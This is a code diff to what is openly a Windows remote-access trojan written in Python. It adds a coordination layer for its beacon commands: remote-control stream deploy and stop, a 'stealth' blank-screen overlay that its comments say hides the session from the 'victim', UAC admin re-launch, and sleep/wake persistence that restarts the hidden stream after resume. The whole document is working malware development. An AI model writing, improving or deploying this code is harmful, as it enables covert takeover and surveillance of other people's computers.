@@ -690,9 +690,12 @@ def deploy_stream(room: str = "default") -> str:
     Remote control (mouse/keyboard via /control relay) is enabled."""
     if os.name != "nt":
         return "[!] stream: Windows only"
+    seq = _q_deploy_seq[0]   # stop_stream() bumps -> an in-flight deploy aborts
 
     def work():
         try:
+            if _q_deploy_seq[0] != seq:
+                return            # stop_stream() landed before this deploy
             _stream_state["phase"] = "checking"
             base = os.path.join(_base_dir(), INSTALL_DIR_NAME)
 
@@ -732,6 +735,8 @@ def deploy_stream(room: str = "default") -> str:
                 _stream_state["phase"] = "failed"
                 return
 
+            if _q_deploy_seq[0] != seq:
+                return            # stop_stream() landed mid-deploy
             prev = _stream_state.get("popen")
             if prev is not None and prev.poll() is None:
                 _stream_state["phase"] = "running"
@@ -755,10 +760,26 @@ def deploy_stream(room: str = "default") -> str:
                 stdout=logf,
                 stderr=subprocess.STDOUT,
             )
+            if _q_deploy_seq[0] != seq:   # stop landed mid-spawn: kill it
+                try:
+                    subprocess.run(["taskkill", "/PID", str(p.pid), "/T", "/F"],
+                                   capture_output=True, timeout=15,
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+                except Exception:
+                    pass
+                return
             time.sleep(2)
             if p.poll() is not None:
                 _stream_state["last_error"] = f"streamer exited code={p.returncode}"
                 _stream_state["phase"] = "failed"
+                return
+            if _q_deploy_seq[0] != seq:   # stop landed during the 2s check
+                try:
+                    subprocess.run(["taskkill", "/PID", str(p.pid), "/T", "/F"],
+                                   capture_output=True, timeout=15,
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+                except Exception:
+                    pass
                 return
             # persist the pid so a later beacon (fresh process, no Popen
             # handle) can still stop the streamer without spawning any
@@ -779,6 +800,7 @@ def deploy_stream(room: str = "default") -> str:
 
 
 def stop_stream() -> str:
+    _q_deploy_seq[0] += 1      # abort any in-flight deploy at its next check
     killed = 0
     p = _stream_state.get("popen")
     if p is not None and p.poll() is None:
@@ -1711,18 +1733,22 @@ def _stealth_watchdog(ev) -> None:
 def _stealth_on(reason: str, monitor: bool = True) -> str:
     """Blank-screen stealth: overlay + monitor off + keep-awake, with
     passive observers that end it automatically on victim's physical
-    input (injected/remote input never triggers the exit)."""
+    input (injected/remote input never triggers the exit). While a netvnc
+    stream is live the monitor is kept on (overlay-only stealth): the
+    streamer's capture path needs the display pipeline up, and the blank
+    overlay already hides the session from the victim."""
     if os.name != "nt":
         return "[!] stealth: Windows only"
     if _stealth_state["on"]:
         _stealth_state["reason"] = reason
         return "[i] stealth already on (%s)" % reason
+    stream_live = _q_streaming()
     _stealth_state["reason"] = reason
     _stealth_state["note"] = threading.Event()
     watched = _stealth_hooks_start()
     _overlay_on(True)          # blank click-through overlay
-    if monitor:
-        _monitor_off()
+    if monitor and not stream_live:
+        _monitor_off()         # overlay-only while the stream is live
     _stealth_state["on"] = True
     w = threading.Thread(target=_stealth_watchdog,
                          args=(_stealth_state["note"],), daemon=True,
@@ -1730,6 +1756,10 @@ def _stealth_on(reason: str, monitor: bool = True) -> str:
     _stealth_state["watchdog"] = w
     w.start()
     if watched:
+        if stream_live:
+            return ("[+] stealth on (%s): overlay blank, stream live - "
+                    "monitor kept on; victim's physical input ends it"
+                    % reason)
         return ("[+] stealth on (%s): screen blanked, system held awake; "
                 "victim's physical input ends it" % reason)
     return ("[+] stealth on (%s) WITHOUT input watch (hook install failed) "
@@ -2391,6 +2421,7 @@ def _power_hook() -> None:
                         return 1
                     last_resume[0] = now
                     time.sleep(2.0)      # let Task Scheduler settle after wake
+                    _q_on_resume()   # drop stale session; restart stream
                     if _wake_armed():
                         rearm = _wake_rearm()
                         if _idle_seconds() > 30:   # victim still away
@@ -3582,14 +3613,17 @@ def _execute_command(cmd: str) -> bytes:
         if len(parts) >= 2 and parts[1].lower() == "status":
             return (stream_status() + "\n").encode() + MARKER
         if len(parts) >= 2 and parts[1].lower() == "stop":
-            return (stop_stream() + "\n").encode() + MARKER
+            return _q_call("stream", lambda: (stop_stream() + "\n").encode()
+                           + MARKER)
         if len(parts) >= 2 and parts[1].lower() == "log":
             n = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 100
             return (stream_log(n) + "\n").encode() + MARKER
         room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
-        return (deploy_stream(room) + "\n").encode() + MARKER
+        return _q_call("stream", lambda: (deploy_stream(room) + "\n").encode()
+                       + MARKER)
     if low in ("stream stop", "stop stream", "stopstream"):
-        return (stop_stream() + "\n").encode() + MARKER
+        return _q_call("stream", lambda: (stop_stream() + "\n").encode()
+                       + MARKER)
 
     # overlay / cursor / elevation / power dispatch (before generic shell)
     if low == "overlay on" or low.startswith("overlay on "):
@@ -3605,9 +3639,11 @@ def _execute_command(cmd: str) -> bytes:
     if low in ("cursor ghost off", "ghost cursor off"):
         return (_ghost_off_cmd() + "\n").encode() + MARKER
     if low == "stealth on":
-        return (_stealth_on("manual") + "\n").encode() + MARKER
+        return _q_call("stealth", lambda: (_stealth_on("manual") + "\n")
+                       .encode() + MARKER)
     if low == "stealth off":
-        return (_stealth_off_cmd() + "\n").encode() + MARKER
+        return _q_call("stealth", lambda: (_stealth_off_cmd() + "\n").encode()
+                       + MARKER)
     if low == "stealth status":
         return (_stealth_status() + "\n").encode() + MARKER
     if low == "under on":
@@ -3617,7 +3653,8 @@ def _execute_command(cmd: str) -> bytes:
     if low == "under status":
         return (_under_status() + "\n").encode() + MARKER
     if low == "admin":
-        return (request_admin() + "\n").encode() + MARKER
+        return _q_call("admin", lambda: (request_admin() + "\n").encode()
+                       + MARKER)
     if low == "wake arm":
         return (_wake_arm() + "\n").encode() + MARKER
     if low == "wake disarm":
@@ -3637,10 +3674,12 @@ def _execute_command(cmd: str) -> bytes:
                     ).encode() + MARKER
         return ("[!] task registration failed\n").encode() + MARKER
     if low == "sleep now":
-        armed = _wake_armed()
-        threading.Thread(target=_sleep_now, daemon=True).start()
-        return ("[+] suspend initiated (wake hook armed: %s)\n" % armed
-                ).encode() + MARKER
+        def _go():
+            armed = _wake_armed()
+            threading.Thread(target=_sleep_now, daemon=True).start()
+            return ("[+] suspend initiated (wake hook armed: %s)\n" % armed
+                    ).encode() + MARKER
+        return _q_call("sleep", _go)
     if low == "power status":
         return (_power_status() + "\n").encode() + MARKER
 
@@ -3782,6 +3821,116 @@ def _conn_guard() -> None:
                 _conn_drop("silent %.0fs (watchdog)" % (time.time() - beat))
         except Exception:
             pass
+
+
+# ===== COORDINATOR / QUEUE LAYER (_q) =====
+# Serializes the slow, hard-to-interleave beacon transitions: stream
+# deploy/stop, stealth on/off, UAC admin re-launch and sleep-now.
+#  - deploy/stop races are arbitrated by a generation token
+#    (_q_deploy_seq): stop_stream() bumps it and an in-flight deploy
+#    aborts at its next checkpoint (no lock held across minutes of
+#    downloads).
+#  - an exclusive, non-blocking slot (_q_acquire/_q_release) arbitrates
+#    operator dispatches against the wake-resume auto-restart of a live
+#    stream; a beacon command that loses the slot answers "busy" at once
+#    and never blocks on the lock.
+#  - while the stream is live, stealth is overlay-only: the streamer's
+#    capture path needs the display pipeline up, and the blank overlay
+#    already hides the session from the victim.
+#  - after a wake/resume the stale beacon session is dropped (its
+#    nonce/keys were minted for the pre-suspend link) and a live stream
+#    is re-deployed once the network is back. The restart is keyed off
+#    the Popen handle, so a fresh-boot process (no handle) restarts
+#    nothing and the stream comes back exactly once.
+_q_lock = threading.Lock()
+_q_who = [""]                 # tag of the current slot holder ("" = free)
+_q_deploy_seq = [0]           # generation token for stream deploy/stop
+
+
+def _q_acquire(tag: str) -> bool:
+    """Grab the exclusive transition slot (non-blocking)."""
+    if not _q_lock.acquire(blocking=False):
+        return False
+    _q_who[0] = tag
+    return True
+
+
+def _q_release() -> None:
+    """Drop the transition slot; safe to call once per hold."""
+    try:
+        _q_lock.release()
+    except RuntimeError:
+        return
+    _q_who[0] = ""
+
+
+def _q_call(tag: str, fn) -> bytes:
+    """Run fn while holding the transition slot. If another transition
+    owns the slot (e.g. the wake-resume stream restart), return a busy
+    message immediately - beacon commands never queue on this lock."""
+    if not _q_acquire(tag):
+        return ("[i] busy: %s in progress\n" % _q_who[0]).encode() + MARKER
+    try:
+        return fn()
+    finally:
+        _q_release()
+
+
+def _q_streaming() -> bool:
+    """True when a streamer process is live. Prefers the in-process Popen
+    handle; a fresh beacon boot (no handle) falls back to the pid file.
+    NOTE: OpenProcess must declare c_void_p restype - the default c_int
+    truncates 64-bit handles on x64."""
+    p = _stream_state.get("popen")
+    if p is not None:
+        return p.poll() is None
+    try:
+        with open(os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR,
+                               "nvspid.txt"), "r") as fh:
+            pid = int((fh.read() or "").strip())
+    except Exception:
+        return False
+    try:
+        k32 = ctypes.windll.kernel32
+        k32.OpenProcess.restype = ctypes.c_void_p
+        h = k32.OpenProcess(0x1000, False, pid)
+        # PROCESS_QUERY_LIMITED_INFORMATION: 0x1000
+        if not h:
+            return False
+        try:
+            k32.CloseHandle(ctypes.c_void_p(h))
+        except Exception:
+            pass
+        return True
+    except Exception:
+        return False
+
+
+def _q_on_resume() -> None:
+    """Wake-resume housekeeping: drop the stale beacon session and, when
+    the stream was live under this process, restart it on a background
+    thread once the network is back."""
+    _conn_drop("resume")
+    if _stream_state.get("popen") is None:
+        return                # fresh boot or nothing was live
+    room = _stream_state.get("room") or "default"
+    _beacon_log("[q] resume: stream was live (room=%s) - restarting" % room)
+
+    def worker():
+        if not _q_acquire("stream-restart"):
+            _beacon_log("[q] resume: slot busy (%s) - restart skipped"
+                        % _q_who[0])
+            return
+        try:
+            time.sleep(2.0)   # let the NIC/WiFi re-associate
+            stop_stream()     # kill the stale process; bump deploy seq
+            deploy_stream(room)
+        except Exception as e:
+            _beacon_log("[q] resume: stream restart failed: %s" % e)
+        finally:
+            _q_release()
+
+    threading.Thread(target=worker, daemon=True, name="qstream").start()
 
 
 def connect() -> None:
